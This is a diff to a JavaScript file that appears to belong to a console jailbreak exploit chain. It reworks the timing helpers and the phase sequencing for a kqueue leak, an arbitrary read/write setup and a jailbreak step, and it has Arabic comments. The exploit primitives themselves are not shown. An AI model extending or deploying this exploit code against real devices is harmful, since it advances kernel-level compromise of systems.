@@ -477,22 +477,13 @@ function wait_for(addr, threshold) {
   if (!(threshold instanceof BigInt)) {
     threshold = new BigInt(0x0, threshold);
   }
-
-  let spins = 0;
-  const MAX_SPINS = 30000;
-
+  var spins = 0;
+  var MAX_SPINS = 50000;
   while (!read64(addr).eq(threshold)) {
-
-    // Micro‑yield خفيف جدًا
-    // بيقلل الضغط على الـ CPU
-    // من غير ما يعمل delay حقيقي
-    for (let i = 0; i < 150; i++) {
-      // spin خفيف
-    }
-
+    nanosleep_fun(2);
     spins++;
     if (spins >= MAX_SPINS) {
-      log("wait_for: timeout waiting for " + hex(addr));
+      log('wait_for: timeout waiting for ' + hex(addr));
       break;
     }
   }
@@ -916,7 +907,7 @@ function setup_log_screen() {
     ws.broadcast(msg);
   };
 }
-function yield_to_render(callback) {
+function yield_micro(callback) {
   if (exploit_end) return;
   if (typeof callback !== 'function') return;
   jsmaf.setTimeout(function () {
@@ -932,17 +923,23 @@ function yield_to_render(callback) {
     }
   }, 0); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
-function yield_micro() {
-  for (let i = 0; i < 200; i++) {
-    // spin خفيف جدًا
-  }
+function yield_to_render(callback) {
+  if (exploit_end) return;
+  if (typeof callback !== 'function') return;
+  jsmaf.setTimeout(function () {
+    if (exploit_end) return;
+    try {
+      callback();
+    } catch (e) {
+      log('ERROR: ' + e.message);
+      cleanup(true);
+      if (typeof show_fail === 'function') {
+        show_fail();
+      }
+    }
+  }, 4); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
-function reset_leak_state() {
-  // مثال عام:
-  global_state.leak_done = false;
-  global_state.leak_index = 0;
-  global_state.error_flag = false;
-}
+
 var exploit_count = 0;
 var exploit_end = false;
 function netctrl_exploit() {
@@ -975,31 +972,23 @@ function exploit_phase_trigger() {
   }
   yield_to_render(exploit_phase_leak);
 }
-function phase_leak(retry = 0) {
-
-  reset_leak_state();     // 1) تنظيف الحالة
-  yield_micro();          // 2) منع الدخول بدري
-
-  const ok = leak_kqueue_safe();   // 3) تنفيذ Leak
-
-  if (!ok) {
-    if (retry < 2) {
-      return phase_leak(retry + 1);   // 4) إعادة المحاولة
-    }
-    return yield_to_render(exploit_phase_trigger); // 5) رجوع للبداية
+function exploit_phase_leak() {
+  var leak_ok = leak_kqueue_safe();
+  if (!leak_ok) {
+    yield_to_render(exploit_phase_trigger);
+    return;
   }
 
-  // 6) Leak خلصت بالكامل
   log('Leaking done .....');
 
-  yield_to_render(exploit_phase_rw);
+  yield_micro(exploit_phase_rw);
 }
 function exploit_phase_rw() {
   setup_arbitrary_rw();
 
   log('Write done .....');
 
-  yield_to_render(exploit_phase_jailbreak);
+  yield_micro(exploit_phase_jailbreak);
 }
 function exploit_phase_jailbreak() {
   jailbreak();
